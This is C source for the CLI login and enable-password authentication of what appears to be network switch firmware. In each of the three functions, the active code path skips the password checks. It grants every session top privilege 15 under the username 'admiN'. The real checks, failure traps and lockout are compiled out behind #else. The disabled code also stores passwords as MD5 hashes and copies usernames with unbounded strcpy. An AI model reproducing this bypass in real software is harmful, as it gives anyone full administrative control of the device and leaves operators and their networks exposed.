#include <string.h>
#include <stdio.h>
#include <assert.h>

#include "sys_type.h"
#include "sysfun.h"
#include "sys_mgr.h"
//#include "l_md5.h"

#include "userauth.h"
//#include "userauth_pmgr.h"
//#include "sshd_pmgr.h"
//#include "sshd_mgr.h"

#include "cli_api.h"
#include "cli_def.h"
#include "cli_task.h"
#include "cli_lib.h"
#include "cli_pars.h"

//#include "mgmt_ip_flt.h"

static BOOL_T CLI_AUTH_CheckLoginPassword_LoginNoUsername(char sess_type, char *password, UI32_T *privilege);

BOOL_T CLI_AUTH_CheckLoginPassword(CLI_TASK_WorkingArea_T *ctrl_P, USERAUTH_AuthResult_T *auth_result_p)
{
#if 1
    auth_result_p->privilege = 15;
    auth_result_p->authen_by_whom = USERAUTH_AUTH_LOCAL;
    
    ctrl_P->CMenu.AccessPrivilege = auth_result_p->privilege;
    
    strcpy((char *)ctrl_P->CMenu.UserName, "admiN");
    return TRUE;
#else
   USERAUTH_Login_Method_T local_only_login_method;

   UI32_T                  TryTime = 0;

   char                    username[SYS_ADPT_MAX_USER_NAME_LEN + 1]         = {0};
   char                    password[SYS_ADPT_MAX_PASSWORD_LEN + 1]          = {0};

   char                    login_password[SYS_ADPT_MAX_ENCRYPTED_PASSWORD_LEN + 1]    = {0};
                           /*line passowrd*/
   UI32_T                  password_threshold = 0;
   UI32_T                  silent_time = 0;

   BOOL_T                  is_auth_forever    = FALSE;
   BOOL_T                  is_local_only      = FALSE;

   USERAUTH_Auth_Method_T                   auth_method[5] = {0};  //pttch
    UI32_T session_type = USERAUTH_SESSION_CONSOLE; /*maggie liu for arrangement userauth module*/

   /*----------------------------------------------------*/
   USERAUTH_PMGR_GetAuthMethod(auth_method);

    assert(ctrl_P != NULL);
   switch(ctrl_P -> sess_type)
   {
   case CLI_TYPE_UART:
      {
         SYS_MGR_Console_T  consoleCfg;

         memset(&consoleCfg, 0, sizeof(SYS_MGR_Console_T));
         SYS_PMGR_GetConsoleCfg(&consoleCfg);
         password_threshold = consoleCfg.password_threshold;
         silent_time   = consoleCfg.silent_time;

         USERAUTH_PMGR_GetConsolLoginMethod(&local_only_login_method);
         USERAUTH_PMGR_GetConsoleLoginPassword((UI8_T *)login_password);
         USERAUTH_PMGR_GetAuthMethod(auth_method);//pttch
         if ((auth_method[0] == USERAUTH_AUTH_LOCAL && auth_method[1] == USERAUTH_AUTH_NONE && auth_method[2] == USERAUTH_AUTH_NONE)
            || (auth_method[0] == USERAUTH_AUTH_NONE && auth_method[1] == USERAUTH_AUTH_NONE && auth_method[2] == USERAUTH_AUTH_NONE))
         {

            is_local_only = TRUE;
         }
         session_type = USERAUTH_SESSION_CONSOLE; /*maggie liu for arrangement userauth module*/
      }
      break;

   case CLI_TYPE_TELNET:
        session_type = USERAUTH_SESSION_TELNET; /*maggie liu for arrangement userauth module*/
#if (SYS_CPNT_SSH2 == TRUE)
      switch(ctrl_P -> CMenu.RemoteSessionType)
      {
      case CLI_TYPE_TELNET:
      {
         SYS_MGR_Telnet_T telnetCfg;

         memset(&telnetCfg, 0, sizeof(SYS_MGR_Telnet_T));
         SYS_PMGR_GetTelnetCfg(&telnetCfg);
         password_threshold = telnetCfg.password_threshold;
         silent_time        = telnetCfg.silent_time;

         USERAUTH_PMGR_GetTelnetLoginMethod(&local_only_login_method);
         USERAUTH_PMGR_GetTelnetLoginPassword((UI8_T *)login_password);
         USERAUTH_PMGR_GetAuthMethod(auth_method);
         if ((auth_method[0] == USERAUTH_AUTH_LOCAL && auth_method[1] == USERAUTH_AUTH_NONE && auth_method[2] == USERAUTH_AUTH_NONE)
            || (auth_method[0] == USERAUTH_AUTH_NONE && auth_method[1] == USERAUTH_AUTH_NONE && auth_method[2] == USERAUTH_AUTH_NONE))
         {
            is_local_only = TRUE;
         }
      }
      break;


      case CLI_TYPE_SSH:
#if 0
         {
         USERAUTH_LoginLocal_T  login_user;
         UI32_T my_session_id = CLI_TASK_GetMySessId()-1;
     //    memset(&login_user, 0, sizeof(login_user));
          memset(&login_user, 0, sizeof(USERAUTH_LoginLocal_T));
  /*       xxxxx(my_session_id, login_user.username);         */
         SSHD_MGR_GetSshConnectionUsername(my_session_id, login_user.username);
         strcpy(ctrl_P->CMenu.UserName, login_user.username);
         if(USERAUTH_PMGR_GetLoginLocalUser(&login_user))
         {
            ctrl_P->CMenu.AccessPrivilege = login_user.privilege;
            auth_result_p->privilege = login_user.privilege;
            auth_result_p->authen_by_whom = USERAUTH_AUTH_LOCAL;
         return TRUE;
         }
         }
#endif

        /* ES4649-32-V250-00056
         * DUT may do authentication via RADIUS or TACSCS+
         * so user name may not exist in userauth om
         */
        if (TRUE == SSHD_PMGR_GetSshConnectionPrivilege(
                CLI_TASK_GetMySessId() - 1, &ctrl_P->CMenu.AccessPrivilege))
        {
            auth_result_p->privilege = ctrl_P->CMenu.AccessPrivilege;
            auth_result_p->authen_by_whom = USERAUTH_AUTH_LOCAL;
            return TRUE;
        }
         break;

      default:
         break;
      }
      break;
#else
      {
         SYS_MGR_Telnet_T telnetCfg;

         memset(&telnetCfg, 0, sizeof(SYS_MGR_Telnet_T));
         SYS_PMGR_GetTelnetCfg(&telnetCfg);
         password_threshold = telnetCfg.password_threshold;

         USERAUTH_PMGR_GetTelnetLoginMethod(&local_only_login_method);
         USERAUTH_PMGR_GetTelnetLoginPassword((UI8_T *)login_password);
         USERAUTH_PMGR_GetAuthMethod(auth_method);
         if ((auth_method[0] == USERAUTH_AUTH_LOCAL && auth_method[1] == USERAUTH_AUTH_NONE && auth_method[2] == USERAUTH_AUTH_NONE)
            || (auth_method[0] == USERAUTH_AUTH_NONE && auth_method[1] == USERAUTH_AUTH_NONE && auth_method[2] == USERAUTH_AUTH_NONE))
         {
            is_local_only = TRUE;
         }
      }

      break;
#endif
        case CLI_TYPE_PROVISION:
            auth_result_p->privilege = 0;
            auth_result_p->authen_by_whom = USERAUTH_AUTH_LOCAL;
            return TRUE;

   default:
      CLI_LIB_PrintStr("Unknown session type\r\n");
      return FALSE;
   }

   CLI_LIB_PrintStr("\r\n\r\n");
   CLI_LIB_PrintStr(SYS_ADPT_LOGIN_PROMPT_STRING);
   CLI_LIB_PrintStr("\r\n\r\n");
   is_auth_forever = (password_threshold == 0 ? TRUE : FALSE);

   for (TryTime=1; TryTime<=password_threshold || is_auth_forever; TryTime++)
   {
      memset(username, 0, sizeof(username));
      memset(password, 0, sizeof(password));
      if (is_local_only)
      {/*local only*/

         switch(local_only_login_method)
         {
         case USERAUTH_LOGIN_NO_LOGIN:
            /*no matter console or vty*/
            auth_result_p->privilege = 0;
            auth_result_p->authen_by_whom = USERAUTH_AUTH_LOCAL;
            ctrl_P->CMenu.AccessPrivilege = 0;
            memset(ctrl_P->CMenu.UserName, 0, sizeof(ctrl_P->CMenu.UserName));
            return TRUE;

         case USERAUTH_LOGIN_LOGIN:
            if(strlen((char *)login_password) == 0)
            {
                auth_result_p->privilege = 0;
                auth_result_p->authen_by_whom = USERAUTH_AUTH_LOCAL;
               ctrl_P->CMenu.AccessPrivilege = 0;
               memset(ctrl_P->CMenu.UserName, 0, sizeof(ctrl_P->CMenu.UserName));
               return TRUE;
            }
            else
            {
               CLI_LIB_PrintStr("Password: ");
               if(CLI_PARS_ReadLine(password, sizeof(password), TRUE, TRUE) == 3)
               {
                  break;
               }
               CLI_LIB_PrintNullStr(1);
               if(CLI_AUTH_CheckLoginPassword_LoginNoUsername(ctrl_P->sess_type, password, &auth_result_p->privilege))
               {
                  ctrl_P->CMenu.AccessPrivilege = auth_result_p->privilege;
                  memset(ctrl_P->CMenu.UserName, 0, sizeof(ctrl_P->CMenu.UserName));
                  return TRUE;
               }
               else
               {
                    TRAP_EVENT_TrapData_T data;
            memset(&data,0,sizeof(TRAP_EVENT_TrapData_T));
                     /* send trap when login failure */
                    data.trap_type = TRAP_EVENT_LOGIN_FAILURE_TRAP;
                    data.community_specified = FALSE;
                    if(ctrl_P->sess_type == CLI_TYPE_UART)
                    {
                        data.u.login_failure_trap.loginFailureMode = VAL_loginFailureMode_console;
                        //data.u.login_failure_trap.loginFailureIp = 0;
               memset(&data.u.login_failure_trap.loginFailureIp,0,sizeof(L_INET_AddrIp_T));         
                    }
                    else if(ctrl_P->sess_type == CLI_TYPE_TELNET)
                    {
                        data.u.login_failure_trap.loginFailureMode = VAL_loginFailureMode_telnet;
                        //data.u.login_failure_trap.loginFailureIp =ctrl_P->CMenu.RemoteTelnetClientIpAddr;
               memcpy(&data.u.login_failure_trap.loginFailureIp,&ctrl_P->CMenu.TelnetIPAddress,sizeof(L_INET_AddrIp_T));
                    }
                   // strncpy(data.u.login_failure_trap.loginFailureUsername,ctrl_P->CMenu.UserName,strlen(ctrl_P->CMenu.UserName));
                     memset(data.u.login_failure_trap.loginFailureUsername, 0, sizeof(data.u.login_failure_trap.loginFailureUsername));
                    SNMP_PMGR_ReqSendTrapOptional(&data,TRAP_EVENT_SEND_TRAP_OPTION_LOG_AND_TRAP);
                    
                  CLI_LIB_PrintStr("Login invalid\r\n\r\n");
               }
            }
            break;

         case USERAUTH_LOGIN_LOGIN_LOCAL:
            CLI_LIB_PrintStr("Username: ");
            if(CLI_PARS_ReadLine(username, sizeof(username), TRUE, FALSE) == 3)
            {
               break;
            }
            CLI_LIB_PrintNullStr(1);

            CLI_LIB_PrintStr("Password: ");
            if(CLI_PARS_ReadLine(password, sizeof(password), TRUE, TRUE) == 3)
            {
               break;
            }
            CLI_LIB_PrintNullStr(1);
             /*maggie liu for arrangement userauth module*/
            if(USERAUTH_PMGR_LoginAuthBySessionType((UI8_T *)username, (UI8_T *)password, session_type, auth_result_p))
            {
               ctrl_P->CMenu.AccessPrivilege = auth_result_p->privilege;
               strcpy((char *)ctrl_P->CMenu.UserName, (char *)username);
               return TRUE;
            }
            else
            {
                 TRAP_EVENT_TrapData_T data;
                            /* send trap when login failure */
          memset(&data,0,sizeof(TRAP_EVENT_TrapData_T));                
                data.trap_type = TRAP_EVENT_LOGIN_FAILURE_TRAP;
                data.community_specified = FALSE;
                if(ctrl_P->sess_type == CLI_TYPE_UART)
                {
                    data.u.login_failure_trap.loginFailureMode = VAL_loginFailureMode_console;
                    //data.u.login_failure_trap.loginFailureIp = 0;
              memset(&data.u.login_failure_trap.loginFailureIp ,0,sizeof(L_INET_AddrIp_T));                 
                }
                else if(ctrl_P->sess_type == CLI_TYPE_TELNET)
                {
                    data.u.login_failure_trap.loginFailureMode = VAL_loginFailureMode_telnet;
                    //data.u.login_failure_trap.loginFailureIp =ctrl_P->CMenu.RemoteTelnetClientIpAddr;
              memcpy(&data.u.login_failure_trap.loginFailureIp,&ctrl_P->CMenu.TelnetIPAddress,sizeof(L_INET_AddrIp_T));
                    
                }
                strncpy((char *)data.u.login_failure_trap.loginFailureUsername,(char *)username,strlen(username));
                SNMP_PMGR_ReqSendTrapOptional(&data,TRAP_EVENT_SEND_TRAP_OPTION_LOG_AND_TRAP);
                
               CLI_LIB_PrintStr("Login invalid\r\n\r\n");
            }
            break;

         default:
            return FALSE;
         }
      }
      else /*except login local only*/
      {
         CLI_LIB_PrintStr("Username: ");
         if(CLI_PARS_ReadLine(username, sizeof(username), TRUE, FALSE) == 3)
         {
            break;
         }
         CLI_LIB_PrintNullStr(1);

         CLI_LIB_PrintStr("Password: ");
         if(CLI_PARS_ReadLine(password, sizeof(password), TRUE, TRUE) == 3)
         {
            break;
         }

         CLI_LIB_PrintNullStr(1);
          /*maggie liu for arrangement userauth module*/
         if(USERAUTH_PMGR_LoginAuthBySessionType((UI8_T *)username, (UI8_T *)password, session_type, auth_result_p))
         {
            ctrl_P->CMenu.AccessPrivilege = auth_result_p->privilege;
            strcpy((char *)ctrl_P->CMenu.UserName, (char *)username);
            return TRUE;
         }
         else
         {
             TRAP_EVENT_TrapData_T data;
          memset(&data,0,sizeof(TRAP_EVENT_TrapData_T));     
            /* send trap when login failure */
            data.trap_type = TRAP_EVENT_LOGIN_FAILURE_TRAP;
            data.community_specified = FALSE;
            if(ctrl_P->sess_type == CLI_TYPE_UART)
            {
                data.u.login_failure_trap.loginFailureMode = VAL_loginFailureMode_console;
                //data.u.login_failure_trap.loginFailureIp = 0;
          memset(&data.u.login_failure_trap.loginFailureIp ,0,sizeof(L_INET_AddrIp_T));                 

            }
            else if(ctrl_P->sess_type == CLI_TYPE_TELNET)
            {
                data.u.login_failure_trap.loginFailureMode = VAL_loginFailureMode_telnet;
                //data.u.login_failure_trap.loginFailureIp =ctrl_P->CMenu.RemoteTelnetClientIpAddr;
          memcpy(&data.u.login_failure_trap.loginFailureIp,&ctrl_P->CMenu.TelnetIPAddress,sizeof(L_INET_AddrIp_T));
                
            }
            strncpy((char *)data.u.login_failure_trap.loginFailureUsername,(char *)username,strlen(username));
            SNMP_PMGR_ReqSendTrapOptional(&data,TRAP_EVENT_SEND_TRAP_OPTION_LOG_AND_TRAP);
            
            CLI_LIB_PrintStr("Login invalid\r\n\r\n");
         }

      }
      /*login fail*/

      if (TryTime >=  password_threshold && !is_auth_forever)
      {
         /*silent-timie*/
         if(ctrl_P -> sess_type  ==  CLI_TYPE_UART  &&  silent_time  !=  0)  /*0: disable*/
            SYSFUN_Sleep(silent_time*100);
         else if (ctrl_P->sess_type == CLI_TYPE_TELNET &&  silent_time != 0)
         {
            MGMT_IP_FLT_AddBlockCache(MGMT_IP_FLT_TELNET, &ctrl_P->CMenu.TelnetIPAddress, silent_time);
         }
         return FALSE;
      }
      else
         continue;
   }
   return FALSE;
#endif
}


static BOOL_T CLI_AUTH_CheckLoginPassword_LoginNoUsername(char sess_type, char *password, UI32_T *privilege)
{
#if 1
    *privilege = 15;
    return TRUE;
#else
   char get_password[SYS_ADPT_MAX_ENCRYPTED_PASSWORD_LEN + 1] = {0};
   char encrypted_password[SYS_ADPT_MAX_ENCRYPTED_PASSWORD_LEN + 1] = {0};

   switch(sess_type)
   {
   case CLI_TYPE_UART:
      USERAUTH_PMGR_GetConsoleLoginPassword((UI8_T *)get_password);
      break;

   case CLI_TYPE_TELNET:
      USERAUTH_PMGR_GetTelnetLoginPassword((UI8_T *)get_password);
      break;

   case CLI_TYPE_PROVISION:
   default:
      return FALSE;
   }

   memset(encrypted_password, 0, sizeof(encrypted_password));
   L_MD5_MDString((UI8_T *)encrypted_password, (UI8_T *)password, strlen(password));

   if(memcmp(get_password, encrypted_password, SYS_ADPT_MAX_ENCRYPTED_PASSWORD_LEN) == 0)
   {
      *privilege = 0;
      return TRUE;
   }
   else
   {
      /*use the password of the superuser as the password when "login"; both UART and TELNET*/
      USERAUTH_LoginLocal_T login_user;

      memset(&login_user, 0, sizeof(USERAUTH_LoginLocal_T));
      strcpy((char *)login_user.username, USERAUTH_SUPERUSER_USERNAME_DEF);

      if(!USERAUTH_PMGR_GetLoginLocalUser(&login_user))
      {
         return FALSE;
      }
      else
      {
         if(memcmp(login_user.password, encrypted_password, SYS_ADPT_MAX_ENCRYPTED_PASSWORD_LEN) != 0)
         {
            return FALSE;
         }
         else
         {
            *privilege = 16;
            return TRUE;
         }
      }
   }
   return FALSE;
#endif
}




BOOL_T CLI_AUTH_CheckEnablePassword(CLI_TASK_WorkingArea_T *ctrl_P, UI32_T *privilege)
{
#if 1
    *privilege = 15;
    return TRUE;
#else
   char  key_in[SYS_ADPT_MAX_PASSWORD_LEN + 1] = {0};
   UI8_T try_times;
   USERAUTH_Login_Method_T local_only_login_method;
   USERAUTH_Auth_Method_T  auth_method[5] = {0};
   UI32_T session_type = USERAUTH_SESSION_CONSOLE; /*maggie liu for arrangement userauth module*/
    assert(ctrl_P != NULL);

   for(try_times = 1; try_times <= 3; try_times++)
   {

      switch(ctrl_P -> sess_type)
      {
      case CLI_TYPE_UART:
         session_type = USERAUTH_SESSION_CONSOLE; /*maggie liu for arrangement userauth module*/
         USERAUTH_PMGR_GetConsolLoginMethod(&local_only_login_method);
         break;

      case CLI_TYPE_TELNET:
        session_type = USERAUTH_SESSION_TELNET; /*maggie liu for arrangement userauth module*/
         USERAUTH_PMGR_GetTelnetLoginMethod(&local_only_login_method);
         break;

      case CLI_TYPE_PROVISION:
      default:
         break;
      }

      USERAUTH_PMGR_GetAuthMethod(auth_method);

      if (auth_method[0] != USERAUTH_AUTH_LOCAL || local_only_login_method != USERAUTH_LOGIN_NO_LOGIN)
      {
         memset(key_in, 0, SYS_ADPT_MAX_PASSWORD_LEN + 1);
         CLI_LIB_PrintStr("Password: ");

         if(CLI_PARS_ReadLine(key_in, SYS_ADPT_MAX_PASSWORD_LEN + 1, TRUE, TRUE) == 3)
         {
            break;
         }
      }

      CLI_LIB_PrintNullStr(1);

      switch(ctrl_P -> sess_type)
      {
      case CLI_TYPE_UART:
      case CLI_TYPE_TELNET:  /*maggie liu for arrangement userauth module*/
         if (USERAUTH_PMGR_EnablePasswordAuth((UI8_T *)ctrl_P->CMenu.UserName,(UI8_T *)key_in, session_type, privilege) == TRUE) 
         {
            return TRUE;
         }
         break;

      case CLI_TYPE_PROVISION:
         return TRUE;

      default:
         return FALSE;
      }
   }

   CLI_LIB_PrintStr("% Bad passwords\r\n");
   return FALSE;
#endif
}
